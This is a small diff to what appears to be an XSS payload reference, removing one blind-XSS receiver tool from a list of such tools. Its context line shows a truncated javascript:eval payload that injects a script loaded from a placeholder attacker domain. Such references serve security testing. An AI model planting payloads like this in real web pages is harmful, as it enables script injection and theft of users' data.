@@ -437,7 +437,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 
 - [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
 - [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
-- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
 - [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
 ### Blind XSS endpoint
